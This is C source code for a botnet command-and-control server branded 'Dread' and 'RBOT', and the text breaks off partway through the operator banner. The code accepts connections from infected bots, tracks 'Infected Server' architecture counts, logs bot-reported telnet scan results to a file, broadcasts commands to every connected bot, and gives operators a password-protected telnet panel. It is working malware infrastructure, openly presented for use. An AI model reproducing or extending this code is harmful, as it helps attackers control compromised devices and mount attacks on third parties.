#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <arpa/inet.h>
#include <unistd.h>

#define MAXFDS 1000000

char uname[80];
struct login_info {
    char username[100];
    char password[100];
};
static struct login_info accounts[100];
struct clientdata_t {
    uint32_t ip;
    char x86;
    char build[7];
    char connected;
} clients[MAXFDS];
struct telnetdata_t {
    int connected;
} managements[MAXFDS];
struct args {
    int sock;
    struct sockaddr_in cli_addr;
};

static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int OperatorsConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;

int fdgets(unsigned char *buffer, int bufferSize, int fd) {
    int total = 0, got = 1;
    while (got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
}

void trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking(int sfd) {
    int flags, s;
    flags = fcntl(sfd, F_GETFL, 0);
    if (flags == -1) {
        perror("fcntl");
        return -1;
    }
    flags |= O_NONBLOCK;
    s = fcntl(sfd, F_SETFL, flags);
    if (s == -1) {
        perror("fcntl");
        return -1;
    }
    return 0;
}

static int create_and_bind(char *port) {
    struct addrinfo hints;
    struct addrinfo *result, *rp;
    int s, sfd;
    memset(&hints, 0, sizeof(struct addrinfo));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    s = getaddrinfo(NULL, port, &hints, &result);
    if (s != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
        return -1;
    }
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        sfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sfd == -1) continue;
        int yes = 1;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1) perror("setsockopt");
        s = bind(sfd, rp->ai_addr, rp->ai_addrlen);
        if (s == 0) {
            break;
        }
        close(sfd);
    }
    if (rp == NULL) {
        fprintf(stderr, "Could not bind\n");
        return -1;
    }
    freeaddrinfo(result);
    return sfd;
}

void broadcast(char *msg, int us, char *sender) {
    int sendMGM = 1;
    if (strcmp(msg, "PING") == 0) sendMGM = 0;
    char *wot = malloc(strlen(msg) + 10);
    memset(wot, 0, strlen(msg) + 10);
    strcpy(wot, msg);
    trim(wot);
    time_t rawtime;
    struct tm *timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    char *timestamp = asctime(timeinfo);
    trim(timestamp);
    int i;
    for (i = 0; i < MAXFDS; i++) {
        if (i == us || (!clients[i].connected)) continue;
        if (sendMGM && managements[i].connected) {
            send(i, "\033[1;35m", 9, MSG_NOSIGNAL);
            send(i, sender, strlen(sender), MSG_NOSIGNAL);
            send(i, ": ", 2, MSG_NOSIGNAL);
        }
        send(i, msg, strlen(msg), MSG_NOSIGNAL);
        send(i, "\n", 1, MSG_NOSIGNAL);
    }
    free(wot);
}

void *BotEventLoop(void *useless) {
    struct epoll_event event;
    struct epoll_event *events;
    int s;
    events = calloc(MAXFDS, sizeof event);
    while (1) {
        int n, i;
        n = epoll_wait(epollFD, events, MAXFDS, -1);
        for (i = 0; i < n; i++) {
            if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN))) {
                clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                close(events[i].data.fd);
                continue;
            } else if (listenFD == events[i].data.fd) {
                while (1) {
                    struct sockaddr in_addr;
                    socklen_t in_len;
                    int infd, ipIndex;

                    in_len = sizeof in_addr;
                    infd = accept(listenFD, &in_addr, &in_len);
                    if (infd == -1) {
                        if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                        else {
                            perror("accept");
                            break;
                        }
                    }

                    clients[infd].ip = ((struct sockaddr_in *) &in_addr)->sin_addr.s_addr;
                    int dup = 0;
                    for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++) {
                        if (!clients[ipIndex].connected || ipIndex == infd) continue;
                        if (clients[ipIndex].ip == clients[infd].ip) {
                            dup = 1;
                            break;
                        }
                    }
                    if (dup) {
                        if (send(infd, ". P\n", 13, MSG_NOSIGNAL) == -1) {
                            close(infd);
                            continue;
                        }
                        close(infd);
                        continue;
                    }
                    s = make_socket_non_blocking(infd);
                    if (s == -1) {
                        close(infd);
                        break;
                    }
                    event.data.fd = infd;
                    event.events = EPOLLIN | EPOLLET;
                    s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
                    if (s == -1) {
                        perror("epoll_ctl");
                        close(infd);
                        break;
                    }
                    clients[infd].connected = 1;
                }
                continue;
            } else {
                int datafd = events[i].data.fd;
                struct clientdata_t *client = &(clients[datafd]);
                int done = 0;
                client->connected = 1;
                client->x86 = 0;
                while (1) {
                    ssize_t count;
                    char buf[2048];
                    memset(buf, 0, sizeof buf);
                    while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, datafd)) > 0) {
                        if (strstr(buf, "\n") == NULL) {
                            done = 1;
                            break;
                        }
                        trim(buf);
                        if (strcmp(buf, "PING") == 0) {
                            if (send(datafd, "PONG\n", 5, MSG_NOSIGNAL) == -1) {
                                done = 1;
                                break;
                            }
                            continue;
                        }
                        if (strstr(buf, "REPORT ") == buf) {
                            char *line = strstr(buf, "REPORT ") + 7;
                            fprintf(telFD, "%s\n", line);
                            fflush(telFD);
                            TELFound++;
                            continue;
                        }
                        if (strstr(buf, "PROBING") == buf) {
                            char *line = strstr(buf, "PROBING");
                            scannerreport = 1;
                            continue;
                        }
                        if (strstr(buf, "REMOVING PROBE") == buf) {
                            char *line = strstr(buf, "REMOVING PROBE");
                            scannerreport = 0;
                            continue;
                        }
                        if (strstr(buf, "1") == buf) {
                            printf("\033[38;5;250m[\033[1;90mDread\033[38;5;250m]\033[1;90m Infected Server\033[38;5;250m [\033[1;90mArch\033[38;5;250m:\033[1;90m X86\033[38;5;250m]\n");
                            client->x86 = 1;
                        }
                        if (strcmp(buf, "PONG") == 0) {
                            continue;
                        }
                    }
                    if (count == -1) {
                        if (errno != EAGAIN) {
                            done = 1;
                        }
                        break;
                    } else if (count == 0) {
                        done = 1;
                        break;
                    }
                    if (done) {
                        client->connected = 0;
                        client->x86 = 0;
                        close(datafd);
                    }
                }
            }
        }
    }
}

unsigned int x86Connected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].x86) continue;
        total++;
    }

    return total;
}

unsigned int BotsConnected() {
    int i = 0, total = 0;
    for (i = 0; i < MAXFDS; i++) {
        if (!clients[i].connected) continue;
        total++;
    }
    return total;
}

int Find_Login(char *str) {
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line = 0;
    char temp[512];

    if ((fp = fopen("login.txt", "r")) == NULL) {
        return (-1);
    }
    while (fgets(temp, 512, fp) != NULL) {
        if ((strstr(temp, str)) != NULL) {
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if (fp)
        fclose(fp);
    if (find_result == 0)return 0;
    return find_line;
}

void *BotWorker(void *sock) {
    int datafd = (int) sock;
    int find_line;
    OperatorsConnected++;
    pthread_t title;
    char uname[80];
    char buf[2048];
    char *username;
    char *password;
    memset(buf, 0, sizeof buf);
    char botnet[2048];
    memset(botnet, 0, 2048);
    char botcount[2048];
    memset(botcount, 0, 2048);

    FILE *fp;
    int i = 0;
    int c;
    fp = fopen("login.txt", "r");
    while (!feof(fp)) {
        c = fgetc(fp);
        ++i;
    }
    int j = 0;
    rewind(fp);
    while (j != i - 1) {
        fscanf(fp, "%s %s", accounts[j].username, accounts[j].password);
        ++j;
    }

    char clearscreen[2048];
    memset(clearscreen, 0, 2048);
    sprintf(clearscreen, "\033[1A");
    char user[800];
    char user2[800];

    sprintf(user, "\033[1;90m\033[2J\033[1;1H");
    sprintf(user2, "\033[1;90mUsername\033[38;5;250m:\033[37m ");

    if (send(datafd, user, strlen(user), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, user2, strlen(user2), MSG_NOSIGNAL) == -1) goto end;
    if (fdgets(buf, sizeof buf, datafd) < 1) goto end;
    trim(buf);
    char *nickstring;
    sprintf(accounts[find_line].username, buf);
    sprintf(uname, buf);
    nickstring = ("%s", buf);
    find_line = Find_Login(nickstring);
    if (strcmp(nickstring, accounts[find_line].username) == 0) {
        char password[800];
        if (send(datafd, clearscreen, strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        sprintf(password, "\r\n\033[1;90mPassword\033[38;5;250m:\033[37m ", accounts[find_line].username);
        if (send(datafd, password, strlen(password), MSG_NOSIGNAL) == -1) goto end;

        if (fdgets(buf, sizeof buf, datafd) < 1) goto end;

        trim(buf);
        if (strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);

        char yesauth1 [500];
        char yesauth2 [500];
        char yesauth3 [500];
        char yesauth4 [500];
        char yesauth5 [500];
        
        sprintf(yesauth1,  "\e[38;5;250mPlease wait\033[37m... \033[38;5;250mI am verifying your credentials \e[37m[\e[38;5;250m|\e[37m]\r\n", accounts[find_line].username);
        sprintf(yesauth2,  "\e[38;5;250mPlease wait\033[37m... \033[38;5;250mI am verifying your credentials \e[37m[\e[38;5;250m/\e[37m]\r\n", accounts[find_line].username);
        sprintf(yesauth3,  "\e[38;5;250mPlease wait\033[37m... \033[38;5;250mI am verifying your credentials \e[37m[\e[38;5;250m-\e[37m]\r\n", accounts[find_line].username);
        sprintf(yesauth4,  "\e[38;5;250mPlease wait\033[37m... \033[38;5;250mI am verifying your credentials \e[37m[\e[38;5;250m/\e[37m]\r\n", accounts[find_line].username);
        sprintf(yesauth5,  "\e[38;5;250mPlease wait\033[37m... \033[38;5;250mI am verifying your credentials \e[37m[\e[38;5;250m-\e[37m]\r\n", accounts[find_line].username);
        
        
        if(send(datafd, clearscreen,        strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, yesauth1, strlen(yesauth1), MSG_NOSIGNAL) == -1) goto end;
        sleep (1);
        if(send(datafd, clearscreen,        strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, yesauth2, strlen(yesauth2), MSG_NOSIGNAL) == -1) goto end;
        sleep (1);
        if(send(datafd, clearscreen,        strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, yesauth3, strlen(yesauth3), MSG_NOSIGNAL) == -1) goto end;
        sleep (1);
        if(send(datafd, clearscreen,        strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, yesauth4, strlen(yesauth4), MSG_NOSIGNAL) == -1) goto end;
        sleep (1);
        if(send(datafd, clearscreen,        strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;
        if(send(datafd, yesauth5, strlen(yesauth5), MSG_NOSIGNAL) == -1) goto end;
        sleep (1);
        if(send(datafd, clearscreen,        strlen(clearscreen), MSG_NOSIGNAL) == -1) goto end;

        goto Banner;
    }
    void *TitleWriter(void *sock) {
        int datafd = (int) sock;
        char string[2048];
        while (1) {
            memset(string, 0, 2048);
            sprintf(string, "%c]0; %d Servers | User: %s %c", '\033', BotsConnected(), accounts[find_line].username, '\007');
            if (send(datafd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
            sleep(2);
        }
    }
    failed:
    if (send(datafd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
    goto end;

    Banner:
    pthread_create(&title, NULL, &TitleWriter, sock);

    char hahafunny [500];
    char hahafunny1 [500];
    char hahafunny2 [500];
    char hahafunny3 [500];
    
    sprintf(hahafunny, "\033[1;90m\033[2J\033[1;1H");
    sprintf(hahafunny1, "\033[37mWelcome to \033[1;95mDread\r\n");
    sprintf(hahafunny2, "\r\n");
    sprintf(hahafunny3, "\033[1;96mVersion\033[37m: \033[1;96m1\033[37m.\033[1;96m3\r\n");
    
    if(send(datafd, hahafunny, strlen(hahafunny), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, hahafunny1, strlen(hahafunny1), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, hahafunny2, strlen(hahafunny2), MSG_NOSIGNAL) == -1) goto end;
    if(send(datafd, hahafunny3, strlen(hahafunny3), MSG_NOSIGNAL) == -1) goto end;
    sleep(5);

    char x1ascii_banner_line1[800];
    char x1ascii_banner_line2[800];
    char x1ascii_banner_line3[800];
    char x1ascii_banner_line4[800];
    char x1ascii_banner_line5[800];
    char x1ascii_banner_line6[800];
    char x1ascii_banner_line7[800];
    char x1ascii_banner_line8[800];
    char x1ascii_banner_line9[800];

    sprintf(x1ascii_banner_line1, "\033[1;90m\033[2J\033[1;1H");
    sprintf(x1ascii_banner_line2, "\033[1;90m\r\n");
    sprintf(x1ascii_banner_line3, "\033[1;90m                    ██████\033[038;5;250m╗\033[1;90m ██████\033[038;5;250m╗ \033[1;90m███████\033[038;5;250m╗ \033[1;90m█████\033[038;5;250m╗ \033[1;90m██████\033[038;5;250m╗ \r\n");
    sprintf(x1ascii_banner_line4, "\033[1;90m\r\n");
    sprintf(x1ascii_banner_line5, "\033[1;90m\r\n");
    sprintf(x1ascii_banner_line6, "\033[1;90m\r\n");
    sprintf(x1ascii_banner_line7, "\033[1;90m\r\n");
    sprintf(x1ascii_banner_line8, "\033[1;90m\r\n");
    sprintf(x1ascii_banner_line9, "\033[1;90m\r\n");

    if (send(datafd, x1ascii_banner_line1, strlen(x1ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x1ascii_banner_line2, strlen(x1ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x1ascii_banner_line3, strlen(x1ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x1ascii_banner_line4, strlen(x1ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x1ascii_banner_line5, strlen(x1ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x1ascii_banner_line6, strlen(x1ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x1ascii_banner_line7, strlen(x1ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x1ascii_banner_line8, strlen(x1ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x1ascii_banner_line9, strlen(x1ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
    sleep(1);
    sprintf(clearscreen, "\033[2J\033[1;1H");

    char x2ascii_banner_line1[800];
    char x2ascii_banner_line2[800];
    char x2ascii_banner_line3[800];
    char x2ascii_banner_line4[800];
    char x2ascii_banner_line5[800];
    char x2ascii_banner_line6[800];
    char x2ascii_banner_line7[800];
    char x2ascii_banner_line8[800];
    char x2ascii_banner_line9[800];
    
    sprintf(x2ascii_banner_line1, "\033[1;91m\033[2J\033[1;1H");
    sprintf(x2ascii_banner_line2, "\033[1;91m\r\n");
    sprintf(x2ascii_banner_line3, "\033[1;91m                    ██████\033[1;90m╗\033[1;91m ██████\033[1;90m╗ \033[1;91m███████\033[1;90m╗ \033[1;91m█████\033[1;90m╗ \033[1;91m██████\033[1;90m╗ \r\n");
    sprintf(x2ascii_banner_line4, "\033[1;91m                    ██\033[1;90m╔══\033[1;91m██\033[1;90m╗\033[1;91m██\033[1;90m╔══\033[1;91m██\033[1;90m╗\033[1;91m██\033[1;90m╔════╝\033[1;91m██\033[1;90m╔══\033[1;91m██\033[1;90m╗\033[1;91m██\033[1;90m╔══\033[1;91m██\033[1;90m╗\r\n");
    sprintf(x2ascii_banner_line5, "\033[1;91m\r\n");
    sprintf(x2ascii_banner_line6, "\033[1;91m\r\n");
    sprintf(x2ascii_banner_line7, "\033[1;91m\r\n");
    sprintf(x2ascii_banner_line8, "\033[1;91m\r\n");
    sprintf(x2ascii_banner_line9, "\033[1;91m\r\n");

    if (send(datafd, x2ascii_banner_line1, strlen(x2ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x2ascii_banner_line2, strlen(x2ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x2ascii_banner_line3, strlen(x2ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x2ascii_banner_line4, strlen(x2ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x2ascii_banner_line5, strlen(x2ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x2ascii_banner_line6, strlen(x2ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x2ascii_banner_line7, strlen(x2ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x2ascii_banner_line8, strlen(x2ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x2ascii_banner_line9, strlen(x2ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
    sleep(1);
    sprintf(clearscreen, "\033[2J\033[1;1H");
    
    char x3ascii_banner_line1[800];
    char x3ascii_banner_line2[800];
    char x3ascii_banner_line3[800];
    char x3ascii_banner_line4[800];
    char x3ascii_banner_line5[800];
    char x3ascii_banner_line6[800];
    char x3ascii_banner_line7[800];
    char x3ascii_banner_line8[800];
    char x3ascii_banner_line9[800];
    
    sprintf(x3ascii_banner_line1, "\033[1;92m\033[2J\033[1;1H");
    sprintf(x3ascii_banner_line2, "\033[1;92m\r\n");
    sprintf(x3ascii_banner_line3, "\033[1;92m                    ██████\033[1;90m╗\033[1;92m ██████\033[1;90m╗ \033[1;92m███████\033[1;90m╗ \033[1;92m█████\033[1;90m╗ \033[1;92m██████\033[1;90m╗ \r\n");
    sprintf(x3ascii_banner_line4, "\033[1;92m                    ██\033[1;90m╔══\033[1;92m██\033[1;90m╗\033[1;92m██\033[1;90m╔══\033[1;92m██\033[1;90m╗\033[1;92m██\033[1;90m╔════╝\033[1;92m██\033[1;90m╔══\033[1;92m██\033[1;90m╗\033[1;92m██\033[1;90m╔══\033[1;92m██\033[1;90m╗\r\n");
    sprintf(x3ascii_banner_line5, "\033[1;92m                    ██\033[1;90m║  \033[1;92m██\033[1;90m║\033[1;92m██████\033[1;90m╔╝\033[1;92m█████\033[1;90m╗  \033[1;92m███████\033[1;90m║\033[1;92m██\033[1;90m║  \033[1;92m██\033[1;90m║\r\n");
    sprintf(x3ascii_banner_line6, "\033[1;92m\r\n");
    sprintf(x3ascii_banner_line7, "\033[1;92m\r\n");
    sprintf(x3ascii_banner_line8, "\033[1;92m\r\n");
    sprintf(x3ascii_banner_line9, "\033[1;92m\r\n");
    
    if (send(datafd, x3ascii_banner_line1, strlen(x3ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x3ascii_banner_line2, strlen(x3ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x3ascii_banner_line3, strlen(x3ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x3ascii_banner_line4, strlen(x3ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x3ascii_banner_line5, strlen(x3ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x3ascii_banner_line6, strlen(x3ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x3ascii_banner_line7, strlen(x3ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x3ascii_banner_line8, strlen(x3ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x3ascii_banner_line9, strlen(x3ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
    sleep(1);
    sprintf(clearscreen, "\033[2J\033[1;1H");
    
    char x4ascii_banner_line1[800];
    char x4ascii_banner_line2[800];
    char x4ascii_banner_line3[800];
    char x4ascii_banner_line4[800];
    char x4ascii_banner_line5[800];
    char x4ascii_banner_line6[800];
    char x4ascii_banner_line7[800];
    char x4ascii_banner_line8[800];
    char x4ascii_banner_line9[800];
    
    sprintf(x4ascii_banner_line1, "\033[1;96m\033[2J\033[1;1H");
    sprintf(x4ascii_banner_line2, "\033[1;96m\r\n");
    sprintf(x4ascii_banner_line3, "\033[1;96m                    ██████\033[1;90m╗\033[1;96m ██████\033[1;90m╗ \033[1;96m███████\033[1;90m╗ \033[1;96m█████\033[1;90m╗ \033[1;96m██████\033[1;90m╗ \r\n");
    sprintf(x4ascii_banner_line4, "\033[1;96m                    ██\033[1;90m╔══\033[1;96m██\033[1;90m╗\033[1;96m██\033[1;90m╔══\033[1;96m██\033[1;90m╗\033[1;96m██\033[1;90m╔════╝\033[1;96m██\033[1;90m╔══\033[1;96m██\033[1;90m╗\033[1;96m██\033[1;90m╔══\033[1;96m██\033[1;90m╗\r\n");
    sprintf(x4ascii_banner_line5, "\033[1;96m                    ██\033[1;90m║  \033[1;96m██\033[1;90m║\033[1;96m██████\033[1;90m╔╝\033[1;96m█████\033[1;90m╗  \033[1;96m███████\033[1;90m║\033[1;96m██\033[1;90m║  \033[1;96m██\033[1;90m║\r\n");
    sprintf(x4ascii_banner_line6, "\033[1;96m                    ██\033[1;90m║  \033[1;96m██\033[1;90m║\033[1;96m██\033[1;90m╔══\033[1;96m██\033[1;90m╗\033[1;96m██\033[1;90m╔══╝  \033[1;96m██\033[1;90m╔══\033[1;96m██\033[1;90m║\033[1;96m██\033[1;90m║  \033[1;96m██\033[1;90m║\r\n");
    sprintf(x4ascii_banner_line7, "\033[1;96m\r\n");
    sprintf(x4ascii_banner_line8, "\033[1;96m");
    sprintf(x4ascii_banner_line9, "\033[01;96m\r\n");
    
    if (send(datafd, x4ascii_banner_line1, strlen(x4ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x4ascii_banner_line2, strlen(x4ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x4ascii_banner_line3, strlen(x4ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x4ascii_banner_line4, strlen(x4ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x4ascii_banner_line5, strlen(x4ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x4ascii_banner_line6, strlen(x4ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x4ascii_banner_line7, strlen(x4ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x4ascii_banner_line8, strlen(x4ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x4ascii_banner_line9, strlen(x4ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
    sleep(1);
    sprintf(clearscreen, "\033[2J\033[1;1H");
    
    char x5ascii_banner_line1[800];
    char x5ascii_banner_line2[800];
    char x5ascii_banner_line3[800];
    char x5ascii_banner_line4[800];
    char x5ascii_banner_line5[800];
    char x5ascii_banner_line6[800];
    char x5ascii_banner_line7[800];
    char x5ascii_banner_line8[800];
    char x5ascii_banner_line9[800];
    
    sprintf(x5ascii_banner_line1, "\033[1;95m\033[2J\033[1;1H");
    sprintf(x5ascii_banner_line2, "\033[1;95m\r\n");
    sprintf(x5ascii_banner_line3, "\033[1;95m                    ██████\033[1;90m╗\033[1;95m ██████\033[1;90m╗ \033[1;95m███████\033[1;90m╗ \033[1;95m█████\033[1;90m╗ \033[1;95m██████\033[1;90m╗ \r\n");
    sprintf(x5ascii_banner_line4, "\033[1;95m                    ██\033[1;90m╔══\033[1;95m██\033[1;90m╗\033[1;95m██\033[1;90m╔══\033[1;95m██\033[1;90m╗\033[1;95m██\033[1;90m╔════╝\033[1;95m██\033[1;90m╔══\033[1;95m██\033[1;90m╗\033[1;95m██\033[1;90m╔══\033[1;95m██\033[1;90m╗\r\n");
    sprintf(x5ascii_banner_line5, "\033[1;95m                    ██\033[1;90m║  \033[1;95m██\033[1;90m║\033[1;95m██████\033[1;90m╔╝\033[1;95m█████\033[1;90m╗  \033[1;95m███████\033[1;90m║\033[1;95m██\033[1;90m║  \033[1;95m██\033[1;90m║\r\n");
    sprintf(x5ascii_banner_line6, "\033[1;95m                    ██\033[1;90m║  \033[1;95m██\033[1;90m║\033[1;95m██\033[1;90m╔══\033[1;95m██\033[1;90m╗\033[1;95m██\033[1;90m╔══╝  \033[1;95m██\033[1;90m╔══\033[1;95m██\033[1;90m║\033[1;95m██\033[1;90m║  \033[1;95m██\033[1;90m║\r\n");
    sprintf(x5ascii_banner_line7, "\033[1;95m                    ██████\033[1;90m╔╝\033[1;95m██\033[1;90m║  \033[1;95m██\033[1;90m║\033[1;95m███████\033[1;90m╗\033[1;95m██\033[1;90m║  \033[1;95m██\033[1;90m║\033[1;95m██████\033[1;90m╔╝\r\n");
    sprintf(x5ascii_banner_line8, "\033[1;95m");
    sprintf(x5ascii_banner_line9, "\033[01;95m\r\n");
    
    if (send(datafd, x5ascii_banner_line1, strlen(x5ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x5ascii_banner_line2, strlen(x5ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x5ascii_banner_line3, strlen(x5ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x5ascii_banner_line4, strlen(x5ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x5ascii_banner_line5, strlen(x5ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x5ascii_banner_line6, strlen(x5ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x5ascii_banner_line7, strlen(x5ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x5ascii_banner_line8, strlen(x5ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x5ascii_banner_line9, strlen(x5ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
    
    sleep(1);
    sprintf(clearscreen, "\033[2J\033[1;1H");
    
    char x6ascii_banner_line1[800];
    char x6ascii_banner_line2[800];
    char x6ascii_banner_line3[800];
    char x6ascii_banner_line4[800];
    char x6ascii_banner_line5[800];
    char x6ascii_banner_line6[800];
    char x6ascii_banner_line7[800];
    char x6ascii_banner_line8[800];
    char x6ascii_banner_line9[800];
    
    sprintf(x6ascii_banner_line1, "\033[1;90m\033[2J\033[1;1H");
    sprintf(x6ascii_banner_line2, "\033[1;90m\r\n");
    sprintf(x6ascii_banner_line3, "\033[1;90m                    ██████\033[038;5;250m╗\033[1;90m ██████\033[038;5;250m╗ \033[1;90m███████\033[038;5;250m╗ \033[1;90m█████\033[038;5;250m╗ \033[1;90m██████\033[038;5;250m╗ \r\n");
    sprintf(x6ascii_banner_line4, "\033[1;90m                    ██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m╗\033[1;90m██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m╗\033[1;90m██\033[038;5;250m╔════╝\033[1;90m██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m╗\033[1;90m██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m╗\r\n");
    sprintf(x6ascii_banner_line5, "\033[1;90m                    ██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\033[1;90m██████\033[038;5;250m╔╝\033[1;90m█████\033[038;5;250m╗  \033[1;90m███████\033[038;5;250m║\033[1;90m██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\r\n");
    sprintf(x6ascii_banner_line6, "\033[1;90m                    ██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\033[1;90m██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m╗\033[1;90m██\033[038;5;250m╔══╝  \033[1;90m██\033[038;5;250m╔══\033[1;90m██\033[038;5;250m║\033[1;90m██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\r\n");
    sprintf(x6ascii_banner_line7, "\033[1;90m                    ██████\033[038;5;250m╔╝\033[1;90m██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\033[1;90m███████\033[038;5;250m╗\033[1;90m██\033[038;5;250m║  \033[1;90m██\033[038;5;250m║\033[1;90m██████\033[038;5;250m╔╝\r\n");
    sprintf(x6ascii_banner_line8, "\033[1;90m                    \033[038;5;250m╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ \r\n");
    sprintf(x6ascii_banner_line9, "\033[01;90m                          [+] \033[038;5;250mWelcome to RBOT \033[01;90m[+]     \r\n");
    
    if (send(datafd, x6ascii_banner_line1, strlen(x6ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x6ascii_banner_line2, strlen(x6ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x6ascii_banner_line3, strlen(x6ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x6ascii_banner_line4, strlen(x6ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
    if (send(datafd, x6ascii_banner_line5, strlen(x6ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
